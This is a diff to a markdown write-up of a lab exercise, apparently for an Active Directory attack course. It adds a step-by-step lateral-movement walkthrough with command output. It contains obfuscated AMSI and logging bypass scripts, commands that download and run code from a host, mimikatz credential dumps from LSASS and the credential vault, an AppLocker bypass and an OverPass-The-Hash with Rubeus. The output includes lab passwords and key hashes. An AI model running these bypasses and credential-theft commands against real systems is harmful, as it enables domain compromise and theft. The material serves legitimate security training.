@@ -10,9 +10,9 @@
 - [x] Local Privilege Escalation
 	- [x] Local Privilege Escalation | Feature Abuse (with PowerUp, winPEAS, PrivEscCheck)
 	- [x] Local Privilege Escalation | GPO Abuse (with Impacket's ntlmrelayx, GPOddity)
-- [ ] Domain Lateral Movement
-	- [ ] Domain Lateral Movement | PowerShell Remoting + Credential Extraction + OverPass-The-Hash (with Invoke-SessionHunter, SafetyKatz, Rubeus, Invoke-Mimi, Runas, Find-PSRemotingLocalAdminAccess)
-- [ ] Domain Privilege Escalation
+- [x] Domain Lateral Movement
+	- [x] Domain Lateral Movement | PowerShell Remoting + Credential Extraction + OverPass-The-Hash (with Invoke-SessionHunter, SafetyKatz, Rubeus, Invoke-Mimi, Runas, Find-PSRemotingLocalAdminAccess)
+- [x] Domain Privilege Escalation
 	- [x] Domain Privilege Escalation | Kerberoasting (with PowerView, Rubeus, John)
 	- [x] Domain Privilege Escalation | Unconstrained Delegation Abuse + Coercion + DCSync (with PowerView, Rubeus, Find-PSRemotingLocalAdminAccess, MS-RPRN, SafetyKatz)
 	- [x] Domain Privilege Escalation | Constrained Delegation Abuse + DCSync (with PowerView, Rubeus, SafetyKatz)
@@ -24,12 +24,12 @@
 	- [x] Domain Persistence | DSRM (with PowerView, Rubeus, SafetyKatz)
 	- [x] Domain Persistence | Replication Rights Abuse + DCSync (with PowerView, Rubeus, SafetyKatz)
 	- [x] Domain Persistence | Security Descriptors Abuse (with Rubeus, RACE)
-- [ ] Cross Trust Attacks
+- [x] Cross Trust Attacks
 	- [x] Cross Trust Attacks | Domains Trust Key Abuse (with Rubeus, SafetyKatz)
 	- [x] Cross Trust Attacks | Child `krbtgt` Key Hash Abuse (with Rubeus)
 	- [x] Cross Trust Attacks | Forests Trust Key Abuse (with Rubeus, SafetyKatz)
 	- [x] Cross Trust Attacks | SQL Server Links Abuse (with PowerUpSQL, Invoke-PowerShellTcpEx)
-	- [ ] Cross Trust Attacks | SQL Server Links Abuse + OPSEC (with ...)
+	- [x] Cross Trust Attacks | SQL Server Links Abuse + Credential Extraction (OPSEC) (with PowerUpSQL, FindLSASSPID, minidumpdotnet, mimikatz, Rubeus, WSManWinRM)
 - [x] AD Certificate Services Abuse
 	- [x] AD Certificate Services Abuse | ESC1 + ESC3 (with Certify, Rubeus)
 
@@ -1662,12 +1662,27 @@ USERNAME=student422👤
 
 #### Domain Lateral Movement | PowerShell Remoting + Credential Extraction + OverPass-The-Hash (with Invoke-SessionHunter, SafetyKatz, Rubeus, Invoke-Mimi, Runas, Find-PSRemotingLocalAdminAccess)
 
+- **Find a Target Machine 1 `dcorp-mgmt` where a Domain Administrator has an Active Session**
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
 [SNIP]
 ```
 
 `Import-Module C:\AD\Tools\Invoke-SessionHunter.ps1`
+
+`notepad C:\AD\Tools\servers.txt`:
+```
+dcorp-adminsrv.dollarcorp.moneycorp.local
+dcorp-appsrv.dollarcorp.moneycorp.local
+dcorp-ci.dollarcorp.moneycorp.local
+dcorp-mgmt.dollarcorp.moneycorp.local
+dcorp-mssql.dollarcorp.moneycorp.local
+dcorp-sql1.dollarcorp.moneycorp.local
+dcorp-stdadmin.dollarcorp.moneycorp.local
+```
 
 `Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access`:
 ```
@@ -1689,35 +1704,696 @@ dcorp-adminsrv dcorp\srvadmin               True
 dcorp-adminsrv dcorp\websvc                 True
 ```
 
-``:
+![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
+```
+[SNIP]
 ```
 
+`type C:\AD\Tools\sbloggingbypass.txt`:
+```powershell
+[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
 ```
 
-``:
+`iex (type C:\AD\Tools\sbloggingbypass.txt)`
+
+`type C:\AD\Tools\amsibypass.txt`:
+```powershell
+S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
 ```
 
+`iex (type C:\AD\Tools\amsibypass.txt)`
+
+`Import-Module C:\AD\Tools\PowerView.ps1`
+
+`Find-DomainUserLocation`:
+```
+[SNIP]
+
+UserDomain      : DCORP-STD422
+UserName        : Administrator
+ComputerName    : dcorp-std422.dollarcorp.moneycorp.local
+IPAddress       : 172.16.100.22
+SessionFrom     :
+SessionFromName :
+LocalAdmin      :
+
+[SNIP]
 ```
 
-``:
+![dcorp-ci | ciadmin](https://custom-icon-badges.demolab.com/badge/dcorp--ci-ciadmin-64b5f6?logo=windows11&logoColor=white)
+
+![HFS - sbloggingbypass.txt](./assets/screenshots/learning_objective_07_hfs_sbloggingbypass.png)
+
+`iex (iwr http://172.16.100.22/sbloggingbypass.txt -UseBasicParsing)`
+
+```powershell
+S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
 ```
 
+![HFS - PowerView.ps1](./assets/screenshots/learning_objective_07_hfs_powerview.png)
+
+`iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.22/PowerView.ps1'))`
+
+`Find-DomainUserLocation`:
+```
+UserDomain      : DCORP-CI
+UserName        : Administrator
+ComputerName    : dcorp-ci.dollarcorp.moneycorp.local
+IPAddress       : 172.16.3.11
+SessionFrom     :
+SessionFromName :
+LocalAdmin      :
+
+UserDomain      : dcorp
+UserName        : svcadmin👤
+ComputerName    : dcorp-mgmt🖥️.dollarcorp.moneycorp.local🏛️
+IPAddress       : 172.16.4.44📌
+SessionFrom     :
+SessionFromName :
+LocalAdmin      :
+```
+🚩
+
+- **Access to the Target Machine 1 `dcorp-mgmt` as a Local Administrator (for Lateral Movement)**
+
+![HFS - Find-PSRemotingLocalAdminAccess.ps1](./assets/screenshots/learning_objective_07_hfs_findpsremotinglocaladminaccess.png)
+
+![dcorp-ci | ciadmin](https://custom-icon-badges.demolab.com/badge/dcorp--ci-ciadmin-64b5f6?logo=windows11&logoColor=white)
+
+`iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.22/Find-PSRemotingLocalAdminAccess.ps1'))`
+
+`Find-PSRemotingLocalAdminAccess`:
+```
+dcorp-ci
+dcorp-mgmt🖥️
 ```
 
-``:
+`winrs -r:dcorp-mgmt cmd /c "set computername && set username"`:
+```
+COMPUTERNAME=DCORP-MGMT🖥️
+USERNAME=ciadmin👤
+```
+🚩
+
+- **Extract the Encryption Key Hash (from the Target Machine 1 `dcorp-mgmt`) of the Target Domain Administrator**
+
+![HFS - Loader.exe](./assets/screenshots/learning_objective_07_hfs_loader.png)
+
+![dcorp-ci | ciadmin](https://custom-icon-badges.demolab.com/badge/dcorp--ci-ciadmin-64b5f6?logo=windows11&logoColor=white)
+
+`iwr http://172.16.100.22/Loader.exe -OutFile C:\Users\Public\Loader.exe`
+
+`echo Y | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe`:
+```
+Overwrite \\dcorp-mgmt\C$\Users\Public\Loader.exe (Yes/No/All)? Y
+C:\Users\Public\Loader.exe
+1 File(s) copied
 ```
 
+`$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.22"`
+
+![HFS -SafetyKatz.exe](./assets/screenshots/learning_objective_07_hfs_safetykatz.png)
+
+`$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"`:
+```
+[SNIP]
+
+mimikatz(commandline) # sekurlsa::evasive-keys📌
+
+[SNIP]
+
+Authentication Id : 0 ; 58588 (00000000:0000e4dc)
+Session📌         : Service from 0📌
+User Name         : svcadmin
+Domain            : dcorp
+Logon Server      : DCORP-DC
+Logon Time        : 1/16/2025 7:43:40 AM
+SID               : S-1-5-21-719815819-3726368948-3917688648-1118
+
+         * Username : svcadmin👤
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL🏛️
+         * Password : *ThisisBlasphemyThisisMadness!!🔑
+         * Key List :
+           aes256_hmac       6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011🔑
+           aes128_hmac       8c0a8695795df6c9a85c4fb588ad6cbd
+           rc4_hmac_nt       b38ff50264b74508085d82c69794a4d8
+           rc4_hmac_old      b38ff50264b74508085d82c69794a4d8
+           rc4_md4           b38ff50264b74508085d82c69794a4d8
+           rc4_hmac_nt_exp   b38ff50264b74508085d82c69794a4d8
+           rc4_hmac_old_exp  b38ff50264b74508085d82c69794a4d8
+
+[SNIP]
+```
+🚩
+
+- **Gain Access to the DC with DA Privileges using an OverPass-The-Hash Attack (for Lateral Movement)**
+
+![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
+```
+[SNIP]
+
+[*] Action: Ask TGT📌
+
+[*] Got domain: dollarcorp.moneycorp.local
+[*] Showing process : True
+[*] Username        : QSXFRIH1
+[*] Domain          : FZUG6238
+[*] Password        : G05M685W
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 712
+[+] LUID            : 0x1581b95
+
+[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
+[!] Pre-Authentication required!
+[!]     AES256 Salt: DOLLARCORP.MONEYCORP.LOCALsvcadmin
+[*] Using aes256_cts_hmac_sha1 hash: 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
+[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\svcadmin'
+[*] Target LUID : 22551445
+[*] Using domain controller: 172.16.2.1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+[SNIP]
+
+[*] Target LUID: 0x1581b95
+[+] Ticket successfully imported!🎟️
+
+  ServiceName              :  krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL
+  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL🏛️
+  UserName                 :  svcadmin🎭 (NT_PRINCIPAL)
+  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
+  StartTime                :  2/19/2025 4:08:05 PM
+  EndTime                  :  2/20/2025 2:08:05 AM
+  RenewTill                :  2/26/2025 4:08:05 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  CmkaAsHeqnhMoRtns5J0uDKQDoCRkORVDlP+4+m7XoI=
+  ASREP (key)              :  6366243A657A4EA04E406F1ABC27F1ADA358CCD0138EC5CA2835067719DC7011
 ```
 
-``:
+![New spawned terminal process 1](./assets/screenshots/learning_objective_07_new_spawned_terminal_process_1.png)
+
+`klist`:
+```
+Current LogonId is 0:0x1581b95
+
+Cached Tickets: (1)
+
+#0>     Client: svcadmin🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
+        Server: krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 2/19/2025 16:08:05 (local)
+        End Time:   2/20/2025 2:08:05 (local)
+        Renew Time: 2/26/2025 16:08:05 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
 ```
 
+`winrs -r:dcorp-dc cmd /c "set computername && set username"`:
+```
+COMPUTERNAME=DCORP-DC🖥️
+USERNAME=svcadmin👤
+```
+🚩
+
+- **Find a Target Machine 2 `dcorp-adminsrv` where we have Local Administrator Privileges*
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
+```
+[SNIP]
 ```
 
-``:
+`Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`
+
+`Find-PSRemotingLocalAdminAccess`:
+```
+dcorp-adminsrv🖥️
+```
+🚩
+
+- **Access to the Target Machine 2 as a Local Administrator (for Lateral Movement)**
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`winrs -r:dcorp-adminsrv cmd`:
+```
+Microsoft Windows [Version 10.0.20348.2762]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\student422>
+```
+🚀
+🚩
+
+- **Extract Credentials from the LSASS Process Memory (of the Target Machine 2 `dcorp-adminsrv`) by Exploiting Gaps in AppLocker GPO Rules**
+
+![dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
+
+`reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2`:
+```
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Appx
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Dll
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Exe
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Msi
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script
 ```
 
+`reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d`:
 ```
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
+    Value    REG_SZ    <FilePathRule Id="06dce67b-934c-454f-a263-2515c8796a5d"📌 Name="(Default Rule) All scripts located in the Program Files folder" Description="Allows members of the Everyone group to run scripts that are located in the Program Files folder."📑 UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%PROGRAMFILES%\*"/></Conditions></FilePathRule>
+```
+
+`exit`
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`Enter-PSSession dcorp-adminsrv`:
+```
+[dcorp-adminsrv]: PS C:\Users\student422\Documents>
+```
+🚀
+
+![dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
+
+`$ExecutionContext.SessionState.LanguageMode`:
+```
+ConstrainedLanguage📌
+```
+
+`Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`:
+```
+[SNIP]
+
+PathConditions      : {%PROGRAMFILES%\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : 06dce67b-934c-454f-a263-2515c8796a5d📌
+Name                : (Default Rule) All scripts located in the Program Files folder
+Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.📑
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+[SNIP]
+```
+
+![Invoke-MimiEx-keys-std422.ps1](./assets/screenshots/learning_objective_07_invokemimiexkeysstd422.png)
+
+`exit`
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
+```
+[SNIP]
+```
+
+`Copy-Item C:\AD\Tools\Invoke-MimiEx-keys-std422.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'`
+
+`dir \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'`:
+```
+    Directory: \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\Program Files
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          5/8/2021   8:27 AM                Common Files
+d-----          5/8/2021   8:15 AM                Internet Explorer
+d-----          5/8/2021   8:15 AM                ModifiableWindowsApps
+d-----        11/11/2022   9:57 AM                Windows Defender
+d-----        10/25/2024  10:36 AM                Windows Defender Advanced Threat Protection
+d-----          5/8/2021   9:34 AM                Windows NT
+d-----          5/8/2021   8:27 AM                WindowsPowerShell
+-a----         2/19/2025   1:53 PM        3063587 Invoke-MimiEx-keys-std422.ps1📌
+```
+
+`Enter-PSSession dcorp-adminsrv`:
+```
+[dcorp-adminsrv]: PS C:\Users\student422\Documents>
+```
+🚀
+
+![dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
+
+`C:\'Program Files'\Invoke-MimiEx-keys-std422.ps1`:
+```
+[SNIP]
+
+mimikatz(powershell) # sekurlsa::ekeys📌
+
+[SNIP]
+
+Authentication Id : 0 ; 136295 (00000000:00021467)
+Session           : Service from 0📌
+User Name         : appadmin
+Domain            : dcorp
+Logon Server      : DCORP-DC
+Logon Time        : 1/16/2025 7:43:13 AM
+SID               : S-1-5-21-719815819-3726368948-3917688648-1117
+
+         * Username : appadmin👤
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL🏛️
+         * Password : *ActuallyTheWebServer1🔑
+         * Key List :
+           aes256_hmac       68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb🔑
+           aes128_hmac       449e9900eb0d6ccee8dd9ef66965797e
+           rc4_hmac_nt       d549831a955fee51a43c83efb3928fa7
+           rc4_hmac_old      d549831a955fee51a43c83efb3928fa7
+           rc4_md4           d549831a955fee51a43c83efb3928fa7
+           rc4_hmac_nt_exp   d549831a955fee51a43c83efb3928fa7
+           rc4_hmac_old_exp  d549831a955fee51a43c83efb3928fa7
+
+[SNIP]
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0📌
+User Name         : DCORP-ADMINSRV$
+Domain            : dcorp
+Logon Server      : (null)
+Logon Time        : 1/16/2025 7:42:59 AM
+SID               : S-1-5-20
+
+         * Username : dcorp-adminsrv$👤
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL🏛️
+         * Password : (null)
+         * Key List :
+           aes256_hmac       e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51🔑
+           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
+           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
+           rc4_md4           b5f451985fd34d58d5120816d31b5565
+           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
+           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565
+
+[SNIP]
+
+Authentication Id : 0 ; 136296 (00000000:00021468)
+Session           : Service from 0📌
+User Name         : websvc
+Domain            : dcorp
+Logon Server      : DCORP-DC
+Logon Time        : 1/16/2025 7:43:13 AM
+SID               : S-1-5-21-719815819-3726368948-3917688648-1114
+
+         * Username : websvc👤
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL🏛️
+         * Password : AServicewhichIsNotM3@nttoBe🔑
+         * Key List :
+           aes256_hmac       2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7🔑
+           aes128_hmac       86a353c1ea16a87c39e2996253211e41
+           rc4_hmac_nt       cc098f204c5887eaa8253e7c2749156f
+           rc4_hmac_old      cc098f204c5887eaa8253e7c2749156f
+           rc4_md4           cc098f204c5887eaa8253e7c2749156f
+           rc4_hmac_nt_exp   cc098f204c5887eaa8253e7c2749156f
+           rc4_hmac_old_exp  cc098f204c5887eaa8253e7c2749156f
+
+[SNIP]
+```
+🚩
+
+- **Extract Credentials from the Windows Credential Vault (of the Target Machine 2 `dcorp-adminsrv`) by Exploiting Gaps in AppLocker GPO Rules**
+
+![Invoke-MimiEx-vault-std422.ps1](./assets/screenshots/learning_objective_07_invokemimiexvaultstd422.png)
+
+`exit`
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
+```
+[SNIP]
+```
+
+`Copy-Item C:\AD\Tools\Invoke-MimiEx-vault-std422.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'`
+
+`dir \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'`:
+```
+    Directory: \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\Program Files
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          5/8/2021   8:27 AM                Common Files
+d-----          5/8/2021   8:15 AM                Internet Explorer
+d-----          5/8/2021   8:15 AM                ModifiableWindowsApps
+d-----        11/11/2022   9:57 AM                Windows Defender
+d-----        10/25/2024  10:36 AM                Windows Defender Advanced Threat Protection
+d-----          5/8/2021   9:34 AM                Windows NT
+d-----          5/8/2021   8:27 AM                WindowsPowerShell
+-a----         2/19/2025   2:15 PM        3063587 Invoke-MimiEx-keys-std422.ps1
+-a----         2/19/2025   2:51 PM        3063392 Invoke-MimiEx-vault-std422.ps1📌
+```
+
+`Enter-PSSession dcorp-adminsrv`:
+```
+[dcorp-adminsrv]: PS C:\Users\student422\Documents>
+```
+🚀
+
+![dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
+
+`C:\'Program Files'\Invoke-MimiEx-vault-std422.ps1`:
+```
+[SNIP]
+
+mimikatz(powershell) # token::elevate📌
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM📌
+
+604     {0;000003e7} 1 D 17413          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !📌
+ * Process Token : {0;0049482c} 0 D 4804172     dcorp\student422        S-1-5-21-719815819-3726368948-3917688648-20607  (10g,24p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 4848253     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz(powershell) # vault::cred /patch📌
+TargetName : Domain:batch=TaskScheduler:Task:{D1FE8F15-FC32-486B-94BC-471E4B1C1BB9} / <NULL>
+UserName   : dcorp\srvadmin👤
+Comment    : <NULL>
+Type       : 2 - domain_password
+Persist    : 2 - local_machine
+Flags      : 00004004
+Credential : TheKeyUs3ron@anyMachine!🔑
+Attributes : 0
+
+[SNIP]
+```
+🚩
+
+- **Use Lateral Movement to the Target Machine 1 `dcorp-mgmt` and Extract Credentials from its LSASS Process Memory**
+
+![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`runas /user:dcorp\srvadmin /netonly cmd`:
+```
+Enter the password for dcorp\srvadmin:📌
+Attempting to start cmd as user "dcorp\srvadmin" ...
+```
+
+![New spawned terminal process 2](./assets/screenshots/learning_objective_07_new_spawned_terminal_process_2.png)
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`whoami /groups`:
+```
+ERROR: Unable to get group membership information.
+```
+❌
+
+`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
+```
+[SNIP]
+```
+
+`Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`
+
+`Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose`:
+```
+VERBOSE: Trying to run a command parallely on the provided computers list using PSRemoting.
+dcorp-adminsrv
+dcorp-mgmt🖥️
+```
+
+`echo Y | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe`:
+```
+Overwrite \\dcorp-mgmt\C$\Users\Public\Loader.exe (Yes/No/All)? Y
+C:\AD\Tools\Loader.exe
+1 File(s) copied
+```
+
+`$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.22"`
+
+`winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::evasive-keys" "exit"`:
+```
+[SNIP]
+
+mimikatz(commandline) # sekurlsa::evasive-keys📌
+
+[SNIP]
+
+Authentication Id : 0 ; 830583 (00000000:000cac77)
+Session📌         : RemoteInteractive from 2📌
+User Name         : mgmtadmin
+Domain            : dcorp
+Logon Server      : DCORP-DC
+Logon Time        : 1/16/2025 8:42:36 AM
+SID               : S-1-5-21-719815819-3726368948-3917688648-1120
+
+         * Username : mgmtadmin👤
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL🏛️
+         * Password : (null)
+         * Key List :
+           aes256_hmac       902129307ec94942b00c6b9d866c67a2376f596bc9bdcf5f85ea83176f97c3aa🔑
+           rc4_hmac_nt       95e2cd7ff77379e34c6e46265e75d754
+           rc4_hmac_old      95e2cd7ff77379e34c6e46265e75d754
+           rc4_md4           95e2cd7ff77379e34c6e46265e75d754
+           rc4_hmac_nt_exp   95e2cd7ff77379e34c6e46265e75d754
+           rc4_hmac_old_exp  95e2cd7ff77379e34c6e46265e75d754
+
+[SNIP]
+
+Authentication Id : 0 ; 58588 (00000000:0000e4dc)
+Session📌         : Service from 0📌
+User Name         : svcadmin
+Domain            : dcorp
+Logon Server      : DCORP-DC
+Logon Time        : 1/16/2025 7:43:40 AM
+SID               : S-1-5-21-719815819-3726368948-3917688648-1118
+
+         * Username : svcadmin👤
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL🏛️
+         * Password : *ThisisBlasphemyThisisMadness!!🔑
+         * Key List :
+           aes256_hmac       6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011🔑
+           aes128_hmac       8c0a8695795df6c9a85c4fb588ad6cbd
+           rc4_hmac_nt       b38ff50264b74508085d82c69794a4d8
+           rc4_hmac_old      b38ff50264b74508085d82c69794a4d8
+           rc4_md4           b38ff50264b74508085d82c69794a4d8
+           rc4_hmac_nt_exp   b38ff50264b74508085d82c69794a4d8
+           rc4_hmac_old_exp  b38ff50264b74508085d82c69794a4d8
+
+[SNIP]
+```
+🚩
+
+- **Extract Credentials from the LSASS Process Memory (of the Target Machine 2 `dcorp-adminsrv`) Disabling AppLocker by Modifying the GPO**
+
+![Install Group Policy Management Console](./assets/screenshots/learning_objective_07_install_gpmc.png)
+
+![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`runas /user:dcorp\student422 /netonly cmd`:
+```
+Enter the password for dcorp\student422:📌
